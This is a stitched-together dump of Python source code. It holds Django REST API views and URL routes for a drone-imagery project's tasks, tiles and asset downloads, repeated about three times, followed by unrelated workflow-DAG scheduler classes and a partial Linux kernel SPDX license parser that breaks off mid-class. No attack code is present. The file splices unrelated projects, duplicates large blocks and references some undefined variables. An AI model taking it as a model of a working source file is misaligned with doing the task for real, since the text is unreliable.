    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="", x="", y=""):
        """
        Get an orthophoto tile
        """
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, "rb")
            return HttpResponse(FileWrapper(tile), content_type="image/png")
        else:
            raise exceptions.NotFound()                    


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """
        Get tile.json for this tasks's orthophoto
        """
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast("orthophoto", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):                    
        def get(self, request, pk=None, project_pk=None, asset=""):
            """
            Downloads a task asset (if available)
            """
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound("Asset does not exist")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, "rb")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or "application/zip"))
                response['Content-Disposition'] = "attachment; filename={}".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()                    

from django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets                    
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),                    

    url(r'^auth/', include('rest_framework.urls')),
]

from django.core.exceptions import ObjectDoesNotExist                    
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }                    

import mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist                    
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json                    

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """
        Retrieve the console output for this task.
        An optional "line" query param can be passed to retrieve
        only the output starting from a certain line number.
        """
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or ""
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({"id": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail="Cannot create task, input provided is not valid.")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="", x="", y=""):
        """
        Get an orthophoto tile
        """
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, "rb")
            return HttpResponse(FileWrapper(tile), content_type="image/png")
        else:
            raise exceptions.NotFound()                    


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """
        Get tile.json for this tasks's orthophoto
        """
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast("orthophoto", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):                    
        def get(self, request, pk=None, project_pk=None, asset=""):
            """
            Downloads a task asset (if available)
            """
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound("Asset does not exist")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, "rb")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or "application/zip"))
                response['Content-Disposition'] = "attachment; filename={}".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()                    

from django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets                    
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),                    

    url(r'^auth/', include('rest_framework.urls')),
]

from django.core.exceptions import ObjectDoesNotExist                    
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }                    

import mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist                    
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json                    

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """
        Retrieve the console output for this task.
        An optional "line" query param can be passed to retrieve
        only the output starting from a certain line number.
        """
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or ""
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({"id": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail="Cannot create task, input provided is not valid.")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="", x="", y=""):
        """
        Get an orthophoto tile
        """
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, "rb")
            return HttpResponse(FileWrapper(tile), content_type="image/png")
        else:
            raise exceptions.NotFound()                    


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """
        Get tile.json for this tasks's orthophoto
        """
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast("orthophoto", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):                    
        def get(self, request, pk=None, project_pk=None, asset=""):
            """
            Downloads a task asset (if available)
            """
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound("Asset does not exist")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, "rb")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or "application/zip"))
                response['Content-Disposition'] = "attachment; filename={}".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()                    

from django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets                    
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),                    

    url(r'^auth/', include('rest_framework.urls')),
]



class SimpleDAG(object):
    ''' A simple implementation of a directed acyclic graph '''

    def __init__(self):
        self.nodes = []
        self.edges = []

    def __contains__(self, obj):
        for node in self.nodes:
            if node['node_object'] == obj:
                return True
        return False

    def __len__(self):
        return len(self.nodes)

    def __iter__(self):
        return self.nodes.__iter__()                    

    def generate_graphviz_plot(self):
        def run_status(obj):
            if obj.do_not_run is True:
                s = "DNR"                    
            else:                    
                s = "RUN"                    
            s += "_{}".format(obj.id)                    
            return s                    

        doc = """
        digraph g {
        rankdir = LR
        """
        for n in self.nodes:
            doc += "%s [color = %s]\n" % (
                run_status(n['node_object']),
                "red" if getattr(n['node_object'], 'status', 'N/A') == 'running' else "black",                    
            )
        for from_node, to_node, label in self.edges:
            doc += "%s -> %s [ label=\"%s\" ];\n" % (
                run_status(self.nodes[from_node]['node_object']),
                run_status(self.nodes[to_node]['node_object']),
                label,
            )
        doc += "}\n"
        gv_file = open('/tmp/graph.gv', 'w')                    
        gv_file.write(doc)
        gv_file.close()

    def add_node(self, obj, metadata=None):
        if self.find_ord(obj) is None:
            self.nodes.append(dict(node_object=obj, metadata=metadata))

    def add_edge(self, from_obj, to_obj, label=None):
        from_obj_ord = self.find_ord(from_obj)
        to_obj_ord = self.find_ord(to_obj)
        if from_obj_ord is None or to_obj_ord is None:
            raise LookupError("Object not found")
        self.edges.append((from_obj_ord, to_obj_ord, label))

    def add_edges(self, edgelist):
        for edge_pair in edgelist:
            self.add_edge(edge_pair[0], edge_pair[1], edge_pair[2])

    def find_ord(self, obj):
        for idx in range(len(self.nodes)):
            if obj == self.nodes[idx]['node_object']:
                return idx
        return None

    def get_dependencies(self, obj, label=None):
        antecedents = []
        this_ord = self.find_ord(obj)
        for node, dep, lbl in self.edges:
            if label:
                if node == this_ord and lbl == label:
                    antecedents.append(self.nodes[dep])
            else:                    
                if node == this_ord:
                    antecedents.append(self.nodes[dep])
        return antecedents

    def get_dependents(self, obj, label=None):
        decendents = []
        this_ord = self.find_ord(obj)
        for node, dep, lbl in self.edges:
            if label:
                if dep == this_ord and lbl == label:
                    decendents.append(self.nodes[node])
            else:                    
                if dep == this_ord:
                    decendents.append(self.nodes[node])
        return decendents

    def get_leaf_nodes(self):
        leafs = []
        for n in self.nodes:
            if len(self.get_dependencies(n['node_object'])) < 1:
                leafs.append(n)
        return leafs

    def get_root_nodes(self):
        roots = []
        for n in self.nodes:
            if len(self.get_dependents(n['node_object'])) < 1:
                roots.append(n)
        return roots


# Python
import copy

# AWX
from awx.main.scheduler.dag_simple import SimpleDAG


class WorkflowDAG(SimpleDAG):
    def __init__(self, workflow_job=None):
        super(WorkflowDAG, self).__init__()
        if workflow_job:
            self._init_graph(workflow_job)

    def _init_graph(self, workflow_job):
        node_qs = workflow_job.workflow_job_nodes
        workflow_nodes = node_qs.prefetch_related('success_nodes', 'failure_nodes', 'always_nodes').all()
        for workflow_node in workflow_nodes:
            self.add_node(workflow_node)

        for node_type in ['success_nodes', 'failure_nodes', 'always_nodes']:
            for workflow_node in workflow_nodes:
                related_nodes = getattr(workflow_node, node_type).all()
                for related_node in related_nodes:
                    self.add_edge(workflow_node, related_node, node_type)

    def bfs_nodes_to_run(self):
        root_nodes = self.get_root_nodes()
        nodes = root_nodes
        nodes_found = []

        for index, n in enumerate(nodes):
            obj = n['node_object']
            job = obj.job

            if not job and obj.do_not_run is False:
                nodes_found.append(n)
            # Job is about to run or is running. Hold our horses and wait for
            # the job to finish. We can't proceed down the graph path until we
            # have the job result.
            elif job and job.status not in ['failed', 'successful']:
                continue
            elif job and job.status == 'failed':
                children_failed = self.get_dependencies(obj, 'failure_nodes')
                children_always = self.get_dependencies(obj, 'always_nodes')
                children_all = children_failed + children_always
                nodes.extend(children_all)
            elif job and job.status == 'successful':
                children_success = self.get_dependencies(obj, 'success_nodes')
                children_always = self.get_dependencies(obj, 'always_nodes')
                children_all = children_success + children_always
                nodes.extend(children_all)
        return [n['node_object'] for n in nodes_found]

    def cancel_node_jobs(self):
        cancel_finished = True
        for n in self.nodes:
            obj = n['node_object']
            job = obj.job

            if not job:
                continue
            elif job.can_cancel:
                cancel_finished = False
                job.cancel()
        return cancel_finished

    def is_workflow_done(self):
        root_nodes = self.get_root_nodes()
        nodes = root_nodes
        is_failed = False

        for index, n in enumerate(nodes):
            obj = n['node_object']
            job = obj.job

            if obj.unified_job_template is None:
                is_failed = True
                continue
            elif not job:
                return False, False

            children_success = self.get_dependencies(obj, 'success_nodes')
            children_failed = self.get_dependencies(obj, 'failure_nodes')
            children_always = self.get_dependencies(obj, 'always_nodes')
            if not is_failed and job.status != 'successful':
                children_all = children_success + children_failed + children_always
                for child in children_all:
                    if child['node_object'].job:
                        break                    
                else:
                    is_failed = True if children_all else job.status in ['failed', 'canceled', 'error']

            if job.status in ['canceled', 'error']:
                continue
            elif job.status == 'failed':
                nodes.extend(children_failed + children_always)
            elif job.status == 'successful':
                nodes.extend(children_success + children_always)
            else:
                # Job is about to run or is running. Hold our horses and wait for
                # the job to finish. We can't proceed down the graph path until we
                # have the job result.
                return False, False
        return True, is_failed

    def mark_dnr_nodes(self):
        root_nodes = self.get_root_nodes()
        nodes = copy.copy(root_nodes)
        nodes_marked_do_not_run = []
        node_ids_visited = set()

        for index, n in enumerate(nodes):
            obj = n['node_object']
            if obj.id in node_ids_visited:
                continue
            node_ids_visited.add(obj.id)
            job = obj.job

            if not job and obj.do_not_run is False and n not in root_nodes:
                parent_nodes = [p['node_object'] for p in self.get_dependents(obj)]
                all_parents_dnr = True
                for p in parent_nodes:
                    if not p.job and p.do_not_run is False:
                        all_parents_dnr = False
                        break                    
                #all_parents_dnr = reduce(lambda p: bool(p.do_not_run == True), parent_nodes)
                if all_parents_dnr:                    
                    obj.do_not_run = True
                    nodes_marked_do_not_run.append(n)

            if obj.do_not_run:
                children_success = self.get_dependencies(obj, 'success_nodes')
                children_failed = self.get_dependencies(obj, 'failure_nodes')
                children_always = self.get_dependencies(obj, 'always_nodes')
                children_all = children_failed + children_always
                nodes.extend(children_all)
            elif job and job.status == 'failed':
                children_failed = self.get_dependencies(obj, 'success_nodes')
                nodes.extend(children_failed)
            elif job and job.status == 'successful':
                children_success = self.get_dependencies(obj, 'failure_nodes')
                nodes.extend(children_success)
        return [n['node_object'] for n in nodes_marked_do_not_run]


#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ "preferred", "other", "exceptions" ]                    
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith("License-Text:"):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

